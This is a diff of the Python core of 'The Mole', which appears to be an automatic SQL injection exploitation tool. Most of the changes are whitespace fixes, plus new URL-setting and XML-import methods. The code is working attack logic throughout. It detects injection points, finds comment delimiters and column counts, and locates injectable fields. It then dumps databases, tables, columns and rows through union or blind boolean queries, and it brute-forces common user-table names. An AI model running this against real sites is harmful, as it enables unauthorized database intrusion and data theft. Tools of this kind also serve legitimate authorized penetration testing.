@@ -1,22 +1,22 @@
 #!/usr/bin/python3
-# 
+#
 # This program is free software; you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
 # the Free Software Foundation; either version 3 of the License, or
 # (at your option) any later version.
-#       
+#
 # This program is distributed in the hope that it will be useful,
 # but WITHOUT ANY WARRANTY; without even the implied warranty of
 # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 # GNU General Public License for more details.
-#       
+#
 # You should have received a copy of the GNU General Public License
 # along with this program; if not, write to the Free Software
 # Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 # MA 02110-1301, USA.
 #
 # Developed by: Nasel(http://www.nasel.com.ar)
-# 
+#
 # Authors:
 # Matías Fontanini
 # Santiago Alessandri
@@ -32,13 +32,16 @@ from dbdump import DatabaseDump
 from threader import Threader
 from output import BlindSQLIOutput
 from xmlexporter import XMLExporter
+import connection
 import sys, time
 
 class TheMole:
-    
+
     ex_string = 'Operation not supported for this dumper'
     field = '[_SQL_Field_]'
     table = '[_SQL_Table_]'
+    wildcard = '[_SQL_]'
+
     users_tables = [
         'adm',
         'admin',
@@ -57,25 +60,29 @@ class TheMole:
         'usr',
         'usrs',
     ]
-    
+
     dbms_mole_list = [MysqlMole, SQLServerMole, PostgresMole, OracleMole]
-    
+
     def __init__(self, threads = 4):
         self.initialized = False
         self.needle = None
         self.url = None
         self.requester = None
-        self.wildcard = None
         self.mode = 'union'
         self.threader = Threader(threads)
         self.prefix = ''
         self.end = ''
         self.verbose = False
         self.timeout = 0
-    
+        self.separator = ''
+        self.comment = ''
+        self.parenthesis = 0
+        self._dbms_mole = None
+        self.database_dump = DatabaseDump()
+
     def restart(self):
         self.initialized = False
-    
+
     def initialize(self):
         self.analyser = DomAnalyser()
         if not self.requester:
@@ -91,14 +98,14 @@ class TheMole:
         self.parenthesis = 0
         self._dbms_mole = None
         self.database_dump = DatabaseDump()
-        
+
         original_request = self.get_requester().request(self.url.replace(self.wildcard, self.prefix))
         try:
             self.analyser.set_good_page(original_request, self.needle)
         except NeedleNotFound:
             print('[-] Could not find needle.')
             return
-        
+
         try:
             self._find_separator()
         except SQLInjectionNotDetected:
@@ -115,33 +122,33 @@ class TheMole:
                 self._detect_dbms_blind()
             except:
                 print('[i] Early DBMS detection failed. Retrying later.')
-            
+
             self.end = ''
             req = self.get_requester().request(
                 self.generate_url(' own3d by 1')
             )
             self._syntax_error_content = self.analyser.node_content(req)
-            
+
             try:
                 self._find_comment_delimiter()
             except SQLInjectionNotExploitable:
                 print('[-] Could not exploit SQL Injection.')
                 return
-            
+
             self._find_column_number()
-            
+
             try:
                 self._find_injectable_field()
             except SQLInjectionNotExploitable:
                 print('[-] Could not exploit SQL Injection.')
                 return
-            
+
             if self._dbms_mole is None:
                 print('[-] Could not detect DBMS.')
                 return
         else:
             self._detect_dbms_blind()
-        
+
         self.initialized = True
 
     def generate_url(self, injection_string):
@@ -158,10 +165,10 @@ class TheMole:
         if self.verbose == True:
             print('[i] Executing query:',url)
         return url
-    
+
     def get_requester(self):
         return self.requester
-        
+
     def set_mode(self, mode):
         if mode == 'blind':
             if self.initialized and self.separator != ' ':
@@ -171,7 +178,7 @@ class TheMole:
         else:
             self.initialized = False
         self.mode = mode
-    
+
     def poll_databases(self):
         if self.database_dump.db_map:
             return list(self.database_dump.db_map.keys())
@@ -218,14 +225,14 @@ class TheMole:
             return list(self.database_dump.db_map.keys())
         if self.mode == 'union':
             data = self._generic_query(
-                self._dbms_mole.schema_count_query(self.query_columns, self.injectable_field), 
+                self._dbms_mole.schema_count_query(self.query_columns, self.injectable_field),
                 lambda x: self._dbms_mole.schema_query(
                     self.query_columns, self.injectable_field, x
                 )
             )
         else:
             data = self._blind_query(
-                lambda x,y: self._dbms_mole.schema_blind_count_query(x, y), 
+                lambda x,y: self._dbms_mole.schema_blind_count_query(x, y),
                 lambda x: lambda y,z: self._dbms_mole.schema_blind_len_query(y, z, offset=x),
                 lambda x,y,z: self._dbms_mole.schema_blind_data_query(x, y, offset=z),
             )
@@ -245,14 +252,14 @@ class TheMole:
             return list(self.database_dump.db_map[db].keys())
         if self.mode == 'union':
             data = self._generic_query(
-                self._dbms_mole.table_count_query(db, self.query_columns, self.injectable_field), 
+                self._dbms_mole.table_count_query(db, self.query_columns, self.injectable_field),
                 lambda x: self._dbms_mole.table_query(
                     db, self.query_columns, self.injectable_field, x
                 ),
             )
         else:
             data = self._blind_query(
-                lambda x,y: self._dbms_mole.table_blind_count_query(x, y, db=db), 
+                lambda x,y: self._dbms_mole.table_blind_count_query(x, y, db=db),
                 lambda x: lambda y,z: self._dbms_mole.table_blind_len_query(y, z, db=db, offset=x),
                 lambda x,y,z: self._dbms_mole.table_blind_data_query(x, y, db=db, offset=z),
             )
@@ -272,14 +279,14 @@ class TheMole:
             return list(self.database_dump.db_map[db][table])
         if self.mode == 'union':
             data = self._generic_query(
-                self._dbms_mole.columns_count_query(db, table, self.query_columns, self.injectable_field), 
+                self._dbms_mole.columns_count_query(db, table, self.query_columns, self.injectable_field),
                 lambda x: self._dbms_mole.columns_query(
                     db, table, self.query_columns, self.injectable_field, x
                 )
             )
         else:
             data = self._blind_query(
-                lambda x,y: self._dbms_mole.columns_blind_count_query(x, y, db=db, table=table), 
+                lambda x,y: self._dbms_mole.columns_blind_count_query(x, y, db=db, table=table),
                 lambda x: lambda y,z: self._dbms_mole.columns_blind_len_query(y, z, db=db, table=table, offset=x),
                 lambda x,y,z: self._dbms_mole.columns_blind_data_query(x, y, db=db, table=table, offset=z),
             )
@@ -291,7 +298,7 @@ class TheMole:
     def get_fields(self, db, table, fields, where="1=1"):
         if self.mode == 'union':
             return self._generic_query(
-                self._dbms_mole.fields_count_query(db, table, self.query_columns, self.injectable_field, where=where), 
+                self._dbms_mole.fields_count_query(db, table, self.query_columns, self.injectable_field, where=where),
                 lambda x: self._dbms_mole.fields_query(
                     db, table, fields, self.query_columns, self.injectable_field, x, where=where
                 ),
@@ -299,7 +306,7 @@ class TheMole:
             )
         else:
             return self._blind_query(
-                lambda x,y: self._dbms_mole.fields_blind_count_query(x, y, db=db, table=table, where=where), 
+                lambda x,y: self._dbms_mole.fields_blind_count_query(x, y, db=db, table=table, where=where),
                 lambda x: lambda y,z: self._dbms_mole.fields_blind_len_query(y, z, fields=fields, db=db, table=table, offset=x, where=where),
                 lambda x,y,z: self._dbms_mole.fields_blind_data_query(x, y, fields=fields, db=db, table=table, offset=z, where=where),
             )
@@ -317,7 +324,7 @@ class TheMole:
                 None,
                 lambda x: lambda y,z: self._dbms_mole.dbinfo_blind_len_query(y, z),
                 lambda x,y,z: self._dbms_mole.dbinfo_blind_data_query(x, y),
-                row_count=1, 
+                row_count=1,
             )
             if len(data) != 1 or len(data[0]) != 3:
                 raise QueryError()
@@ -354,14 +361,37 @@ class TheMole:
                     print('[+] Table',table,'exists.')
             except:
                 pass
-    
+
     def brute_force_users_tables(self, db):
         self.brute_force_tables(db, TheMole.users_tables)
-        
+
+
+    def set_url(self, url):
+        if not '?' in url:
+            raise Exception('URL requires GET parameters')
+
+        url = url.split('?')
+        self.requester = connection.HttpRequester(url[0], timeout=self.timeout)
+        self.url = url[1]
+        if self.wildcard not in self.url:
+            self.url += self.wildcard
+
+    def get_url(self):
+        try:
+            return self.requester.url + '?' + self.url
+        except AttributeError:
+            return ''
+
     def export_xml(self, filename):
         exporter = XMLExporter()
         exporter.export(self, self.database_dump.db_map, filename)
         print("[*] Exportation successful")
+
+    def import_xml(self, filename):
+        exporter = XMLExporter()
+        exporter.load(self, self.database_dump.db_map, filename)
+        self.initialized = True
+        print("[*] Importation successful")
 
     def _generic_blind_len(self, count_fun, trying_msg, max_msg):
         length = 0
@@ -381,7 +411,7 @@ class TheMole:
         sys.stdout.flush()
         pri = last // 2
         while pri < last:
-            
+
             if self.stop_query:
                 return pri
             medio = ((pri + last) // 2) + ((pri + last) & 1)
@@ -395,7 +425,7 @@ class TheMole:
             else:
                 last = medio - 1
         return pri
-    
+
     # Finds a character in the tuple result
     def _blind_query_character(self, query_fun, index, offset, output=None):
         pri   = ord(' ')
@@ -418,19 +448,19 @@ class TheMole:
                 output.set(chr(medio+1), index - 1)
                 return chr(medio+1)
             else:
-                if pri == last:                
+                if pri == last:
                     output.set(chr(medio), index - 1)
-                    return chr(medio)   
+                    return chr(medio)
                 else:
                     output.set(chr(medio), index - 1)
-    
+
     def _blind_query(self, count_fun, length_fun, query_fun, offset=0, row_count=None):
         self.stop_query = False
         if count_fun is None:
             count = row_count
         else:
             count = self._generic_blind_len(
-                count_fun, 
+                count_fun,
                 lambda x: '\rTrying count: ' + str(x),
                 lambda x: '\rAt most count: ' + str(x)
             )
@@ -457,7 +487,7 @@ class TheMole:
             results.append(output.split(self._dbms_mole.blind_field_delimiter()))
         return results
 
-    
+
     def _find_separator(self):
         separator_list = ['\'', '"', ' ', '\0']
         equal_cmp = { '\'' : 'like', '"' : 'like', ' ' : '='}
@@ -484,10 +514,10 @@ class TheMole:
                     return
         if not separator:
             raise SQLInjectionNotDetected()
-    
+
     def _find_comment_delimiter(self):
         #Find the correct comment delimiter
-        
+
         comment_list = ['#', '--', '/*', ' ']
         comment = None
         for parenthesis in range(0, 3):
@@ -507,9 +537,9 @@ class TheMole:
         if comment is None:
             self.parenthesis = 0
             raise SQLInjectionNotExploitable()
-        
+
         print("[+] Found comment delimiter:", self.comment)
-    
+
     def _find_column_number(self):
         #Find the number of columns of the query
         #First get the content of needle in a wrong situation
@@ -517,7 +547,7 @@ class TheMole:
             self.generate_url(' order by 15000')
         )
         content_of_needle = self.analyser.node_content(req)
-        
+
         last = 2
         done = False
         new_needle_content = self.analyser.node_content(
@@ -552,7 +582,7 @@ class TheMole:
                 last = medio - 1
         self.query_columns = pri
         print("\r[+] Found number of columns:", self.query_columns)
-    
+
     def _find_injectable_field_using(self, dbms_mole):
         base = 714
         fingers = dbms_mole.injectable_field_fingers(self.query_columns, base)
@@ -625,7 +655,7 @@ class SQLInjectionNotExploitable(Exception):
 
 class QueryError(Exception):
     pass
-    
+
 class MoleAttributeRequired(Exception):
     def __init__(self, msg):
         self.message = msg
